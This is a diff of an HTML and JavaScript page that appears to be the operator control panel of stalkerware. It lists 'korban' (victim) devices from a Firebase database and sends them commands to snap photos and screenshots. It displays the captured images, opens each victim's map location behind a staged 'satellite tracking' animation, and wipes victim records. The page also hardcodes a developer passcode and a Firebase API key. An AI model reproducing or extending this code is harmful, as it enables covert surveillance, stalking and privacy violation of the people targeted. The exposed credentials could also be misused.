@@ -3,117 +3,234 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>THE PURPLE METEOR | v3.0 WIPE</title>
+    <title>METEOR | ORBIT 4K</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --crystal: rgba(168, 85, 247, 0.2); --neon: #c084fc; --deep: #0a0514; --red: #ff4444; }
-        body { background: var(--deep); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
-        .meteor-box { position: fixed; inset: 0; pointer-events: none; z-index: 0; }
-        .meteor { position: absolute; width: 2px; height: 80px; background: linear-gradient(to bottom, transparent, var(--neon)); animation: fall 3s linear infinite; }
-        @keyframes fall { 0% { transform: translateY(-100px) translateX(100px) rotate(-45deg); opacity: 0; } 100% { transform: translateY(100vh) translateX(-100vh) rotate(-45deg); opacity: 0; } }
-        #login-screen { position: fixed; inset: 0; background: var(--deep); display: flex; align-items: center; justify-content: center; z-index: 10000; }
-        .glass { background: var(--crystal); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); padding: 25px; border-radius: 20px; width: 300px; text-align: center; }
-        input { background: rgba(0,0,0,0.3); border: 1px solid var(--neon); border-radius: 10px; padding: 12px; color: white; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
-        .btn { background: linear-gradient(45deg, #7c3aed, var(--neon)); color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .container { position: relative; z-index: 1; padding: 20px; height: 100vh; overflow-y: auto; }
-        .node-card { background: var(--crystal); border: 1px solid rgba(192, 132, 252, 0.3); padding: 15px; margin-bottom: 10px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; }
-        .btn-wipe { background: var(--red); color: white; width: 60px; font-size: 10px; padding: 5px; border-radius: 5px; border: none; cursor: pointer; }
+        :root { --dev: #ff00ea; --own: #ffd700; --adm: #00f2ff; --bg: #0a0a0c; --red: #ff4444; }
+        body { 
+            background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0;
+            background-image: url('https://media.tenor.com/7W88p6-7P54AAAAC/anime-girl.gif');
+            background-size: cover; background-attachment: fixed; overflow: hidden;
+        }
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: -1; }
+        
+        /* UI Components */
+        #login-screen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .card { background: rgba(255,255,255,0.05); border: 1px solid var(--dev); padding: 25px; border-radius: 15px; width: 300px; text-align: center; box-shadow: 0 0 15px rgba(255, 0, 234, 0.2); }
+        input { background: transparent; border: 1px solid var(--dev); color: #fff; padding: 12px; width: 100%; border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
+        button { background: var(--dev); color: #000; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        button:hover { opacity: 0.8; transform: scale(1.02); }
+        
+        .container { padding: 20px; max-width: 600px; margin: auto; height: 100vh; overflow-y: auto; box-sizing: border-box; padding-bottom: 100px; }
+        .target-item { background: rgba(255,255,255,0.07); border-left: 4px solid var(--adm); padding: 15px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+        .btn-wipe { background: var(--red); color: white; width: auto; font-size: 10px; padding: 6px 12px; border-radius: 5px; margin: 0; }
+        .btn-wipe-all { background: transparent; border: 2px solid var(--red); color: var(--red); margin-top: 20px; }
+        .btn-wipe-all:hover { background: var(--red); color: white; }
+
+        /* ========================================
+           ANIMASI ORBIT 4K (FULLSCREEN OVERLAY)
+           ======================================== */
+        #orbit-overlay {
+            position: fixed; inset: 0; background: #000; z-index: 9999;
+            display: none; align-items: center; justify-content: center;
+            flex-direction: column; color: var(--adm); font-family: 'Courier New', monospace;
+        }
+        
+        /* Gambar Bumi HD/4K */
+        .earth {
+            width: 300px; height: 300px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/22/Earth_Western_Hemisphere_transparent_background.png');
+            background-size: cover; border-radius: 50%;
+            box-shadow: 0 0 50px rgba(0, 242, 255, 0.5);
+            animation: rotateEarth 20s linear infinite;
+            position: relative;
+        }
+
+        /* Satelit Orbit Ungu */
+        .satellite {
+            position: absolute; width: 50px; height: 50px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/International_Space_Station_after_undocking_of_STS-132.png/800px-International_Space_Station_after_undocking_of_STS-132.png');
+            background-size: cover;
+            top: -100px; left: 50%; transform: translateX(-50%);
+            filter: drop-shadow(0 0 10px var(--dev));
+        }
+
+        /* Sinar Laser dari Bumi ke Satelit */
+        .laser-beam {
+            position: absolute; bottom: 50%; left: 50%;
+            width: 4px; height: 0;
+            background: linear-gradient(to top, var(--adm), var(--dev));
+            transform: translateX(-50%);
+            box-shadow: 0 0 15px var(--dev);
+            opacity: 0;
+        }
+
+        /* Teks Status di bawah Bumi */
+        #orbit-status { margin-top: 30px; font-size: 14px; text-align: center; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* Keyframes Animasi */
+        @keyframes rotateEarth { from { background-position: 0 0; } to { background-position: 100% 0; } }
+        
+        @keyframes shootLaser {
+            0% { height: 0; opacity: 1; bottom: 50%; }
+            50% { height: 120px; opacity: 1; bottom: 50%; }
+            100% { height: 0; opacity: 0; bottom: 100%; }
+        }
+
+        /* Trigger Animasi */
+        .animating .laser-beam { animation: shootLaser 2s ease-in-out infinite; }
     </style>
 </head>
 <body onload="checkAuth()">
-    <div class="meteor-box" id="meteors"></div>
-    <div id="login-screen"><div class="glass"><h2>METEOR</h2><input type="password" id="entry-key" placeholder="KEY"><button class="btn" onclick="login()">IGNITE</button></div></div>
+    <div class="overlay"></div>
+
+    <div id="orbit-overlay">
+        <div class="earth animating">
+            <div class="satellite"></div>
+            <div class="laser-beam"></div>
+        </div>
+        <div id="orbit-status">
+            [SYS]: ESTABLISHING 4K UPLINK...<br>
+            <span style="color:white; font-size:10px;">RECEIVING GPS DATA FROM SATELLITE</span>
+        </div>
+    </div>
+
+    <div id="login-screen">
+        <div class="card">
+            <h2 style="color:var(--dev); letter-spacing:2px;">METEOR LOGIN</h2>
+            <input type="password" id="pass" placeholder="ACCESS KEY">
+            <button onclick="login()">IGNITE ACCESS</button>
+        </div>
+    </div>
 
     <div class="container">
-        <h3 id="display-name" style="color:var(--neon);">Syncing...</h3>
-        <div id="node-list"></div>
-        <div id="node-view" style="margin-top:20px;"></div>
-        <div id="admin-panel" style="display:none; margin-top:30px; border-top: 1px solid rgba(255,255,255,0.1); padding-top:20px;">
-            <h4 style="color:#ffd700;">USER MANAGEMENT</h4>
-            <div id="tools"></div>
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 15px;">
+            <h3 style="color: var(--dev); margin:0;">🛰️ RADAR DASHBOARD</h3>
+            <div id="u-info" style="font-size: 11px; opacity:0.8;"></div>
+        </div>
+        
+        <div id="node-list">Scanning...</div>
+
+        <div id="global-wipe" style="display:none; text-align:center;">
+            <button class="btn-wipe-all" onclick="wipeAll()">⚠️ WIPE ALL SIGNALS (RESET)</button>
+        </div>
+
+        <div id="control-box" style="margin-top:20px; display:none;">
+            <div class="card" style="width:100%; text-align:left; border-color:var(--adm); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);">
+                <h4 id="target-title" style="margin:0 0 15px 0; color:var(--adm);">CONTROL</h4>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <button onclick="exec('TAKE')">📸 SNAP FOTO</button>
+                    <button style="background:white; color:black;" onclick="triggerOrbitAnimation()">🌍 TRACK LOKASI (4K)</button>
+                </div>
+                <div id="feed" style="margin-top:15px; min-height: 50px; text-align:center;"></div>
+            </div>
+        </div>
+
+        <div id="mgmt-panel" style="margin-top:40px; display:none; border-top: 1px solid rgba(255, 0, 234, 0.3); padding-top:20px;">
+            <h4 style="color: var(--own); margin:0 0 15px 0;">🛡️ USER MANAGEMENT</h4>
+            <div id="mgmt-tools"></div>
         </div>
     </div>
 
 <script>
-    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
+    // --- FIREBASE CONFIG (SAMA DENGAN SEBELUMNYA) ---
+    const config = { 
+        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
+        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
+    };
     firebase.initializeApp(config); const db = firebase.database();
-    let currentUser = null;
+    let user = null; let activeTarget = null; let currentMaps = "";
 
     function login() {
-        const key = document.getElementById('entry-key').value;
-        if(key === "dev111") { 
-            currentUser = { n: "Kalz", r: "DEVELOPER", p: 100 };
-            sessionStorage.setItem('meteor_v3', JSON.stringify(currentUser));
-            location.reload();
-        } else {
-            db.ref('users/' + key).once('value', s => {
-                if(s.exists()) { sessionStorage.setItem('meteor_v3', JSON.stringify(s.val())); location.reload(); }
-                else alert("KEY INVALID");
-            });
-        }
+        const k = document.getElementById('pass').value;
+        if(k === "dev111") saveSession({ n: "Kalz", r: "DEVELOPER", p: 100 });
+        else db.ref('users/' + k).once('value', s => { if(s.exists()) saveSession(s.val()); else alert("KEY NOT FOUND"); });
     }
+
+    function saveSession(data) { sessionStorage.setItem('meteor_v7', JSON.stringify(data)); location.reload(); }
 
     function checkAuth() {
-        const session = sessionStorage.getItem('meteor_v3');
+        const session = sessionStorage.getItem('meteor_v7');
         if(session) {
-            currentUser = JSON.parse(session);
+            user = JSON.parse(session);
             document.getElementById('login-screen').style.display = 'none';
-            renderMeteors();
-            document.getElementById('display-name').innerText = `💎 ${currentUser.n} [${currentUser.r}]`;
-            if(currentUser.p > 1) {
-                document.getElementById('admin-panel').style.display = 'block';
-                document.getElementById('tools').innerHTML = `<button class="btn" onclick="createAcc()">➕ CREATE NEW USER</button>`;
+            document.getElementById('u-info').innerText = `${user.n} | ${user.r}`;
+            if(user.p > 1) {
+                document.getElementById('mgmt-panel').style.display = 'block';
+                document.getElementById('global-wipe').style.display = 'block';
+                renderMgmt();
             }
-            listenNodes();
+            startRadar();
         }
     }
 
-    function listenNodes() {
+    function startRadar() {
         db.ref('korban').on('value', s => {
-            let h = ""; s.forEach(c => {
-                h += `<div class="node-card" onclick="viewNode('${c.key}')">
+            let h = "";
+            s.forEach(c => {
+                h += `<div class="target-item" onclick="viewNode('${c.key}', '${c.val().maps}')">
                         <span>📍 NODE_${c.key.substring(1,7)}</span>
                         <button class="btn-wipe" onclick="wipeData('${c.key}')">WIPE</button>
                       </div>`;
             });
-            document.getElementById('node-list').innerHTML = h || "Searching...";
+            document.getElementById('node-list').innerHTML = h || "No Active Signals.";
         });
     }
 
-    function viewNode(id) {
-        db.ref('korban/'+id).once('value', s => {
-            const k = s.val();
-            document.getElementById('node-view').innerHTML = `
-                <div class="glass" style="width:100%; box-sizing:border-box;">
-                    <button class="btn" onclick="exec('${id}','TAKE')">📸 SNAP</button>
-                    <button class="btn" onclick="exec('${id}','SHOT')">🖼️ SHOT</button>
-                    <button class="btn" style="background:white;color:black" onclick="window.open('${k.maps}')">🌍 MAPS</button>
-                    <div id="img-box" style="margin-top:10px"></div>
-                </div>`;
-            db.ref('hasil_foto/'+id).on('value', f => { if(f.val()) document.getElementById('img-box').innerHTML = `<img src="${f.val().foto}" style="width:100%; border-radius:10px;">`; });
+    function viewNode(id, maps) {
+        activeTarget = id; currentMaps = maps;
+        document.getElementById('control-box').style.display = 'block';
+        document.getElementById('target-title').innerText = `NODE: ${id.substring(1,7)}`;
+        // Scroll ke Control Box
+        document.getElementById('control-box').scrollIntoView({ behavior: 'smooth' });
+        
+        db.ref('hasil_foto/'+id).on('value', f => {
+            const feed = document.getElementById('feed');
+            if(f.val()) feed.innerHTML = `<img src="${f.val().foto}" style="width:100%; border-radius:8px; border:1px solid var(--adm); box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);">`;
+            else feed.innerHTML = "<span style='font-size:10px; opacity:0.5;'>Waiting for photo...</span>";
         });
     }
 
-    function exec(id, a) { db.ref('commands/'+id).set({ action: a, t: Date.now() }); }
-    
-    // FUNGSI HAPUS RIWAYAT
-    function wipeData(id) {
-        event.stopPropagation();
-        if(confirm("Hapus semua riwayat target ini?")) {
-            db.ref('korban/'+id).remove();
-            db.ref('hasil_foto/'+id).remove();
-            db.ref('hasil_screenshot/'+id).remove();
-            db.ref('commands/'+id).remove();
-            alert("Data Wiped.");
-        }
+    function exec(a) { db.ref('commands/'+activeTarget).set({ action: a, t: Date.now() }); alert("Signal Pushed!"); }
+
+    // ========================================
+    // FUNGSI LOGIK ANIMASI ORBIT
+    // ========================================
+    function triggerOrbitAnimation() {
+        if(!currentMaps) { alert("No location data yet."); return; }
+        
+        const overlay = document.getElementById('orbit-overlay');
+        const status = document.getElementById('orbit-status');
+        
+        // 1. Tampilkan Overlay
+        overlay.style.display = 'flex';
+        
+        // 2. Sequence Teks Status (Simulasi 4K Scan)
+        setTimeout(() => { status.innerHTML = "[SYS]: SATELLITE LINK ESTABLISHED<br><span style='color:var(--dev);'>PREPARING 4K RESOLUTION SCAN...</span>"; }, 1500);
+        setTimeout(() => { status.innerHTML = "[SYS]: SCANNING TARGET... [99%]<br><span style='color:var(--own);'>DOWNSCALING FROM HD 4K TO MAPS LINK</span>"; }, 3000);
+        
+        // 3. Selesai Animasi (5 Detik), Buka Maps
+        setTimeout(() => {
+            overlay.style.display = 'none';
+            // Kembalikan teks awal
+            status.innerHTML = "[SYS]: ESTABLISHING 4K UPLINK...<br><span style='color:white; font-size:10px;'>RECEIVING GPS DATA FROM SATELLITE</span>";
+            // Buka Google Maps
+            window.open(currentMaps);
+        }, 5000);
     }
 
-    function createAcc() {
-        const n = prompt("Nama:"), k = prompt("Passcode:"), r = prompt("Role (OWNER/ADMIN/MEMBER):");
-        if(n && k) db.ref('users/'+k).set({ n:n, r:r, p: r==="OWNER"?3:(r==="ADMIN"?2:1) });
+    // --- FUNGSI WIPE & MGMT (SAMA DENGAN v6) ---
+    function wipeData(id) { event.stopPropagation(); if(confirm("Hapus target?")) { db.ref('korban/'+id).remove(); db.ref('hasil_foto/'+id).remove(); db.ref('commands/'+id).remove(); document.getElementById('control-box').style.display = 'none'; } }
+    function wipeAll() { if(confirm("⚠️ WIPE ALL?")) { db.ref('korban').remove(); db.ref('hasil_foto').remove(); db.ref('commands').remove(); document.getElementById('control-box').style.display = 'none'; } }
+    function renderMgmt() {
+        let h = "";
+        if(user.r === "DEVELOPER") h += `<button onclick="addUser('OWNER')">+ CREATE OWNER</button>`;
+        if(user.r === "DEVELOPER" || user.r === "OWNER") h += `<button onclick="addUser('ADMIN')">+ CREATE ADMIN</button>`;
+        h += `<button onclick="addUser('MEMBER')">+ CREATE MEMBER</button>`;
+        document.getElementById('mgmt-tools').innerHTML = h;
     }
-    function renderMeteors() { const b = document.getElementById('meteors'); for(let i=0; i<15; i++) { let m = document.createElement('div'); m.className='meteor'; m.style.left=Math.random()*100+'%'; m.style.animationDelay=Math.random()*3+'s'; b.appendChild(m); } }
+    function addUser(role) { const n = prompt(`Nama ${role}:`), k = prompt(`Passcode:`); if(n && k) { const p = role === 'OWNER'?3:(role==='ADMIN'?2:1); db.ref('users/'+k).set({ n:n, r:role, p:p }); alert("Account Created!"); } }
 </script>
 </body>
 </html>
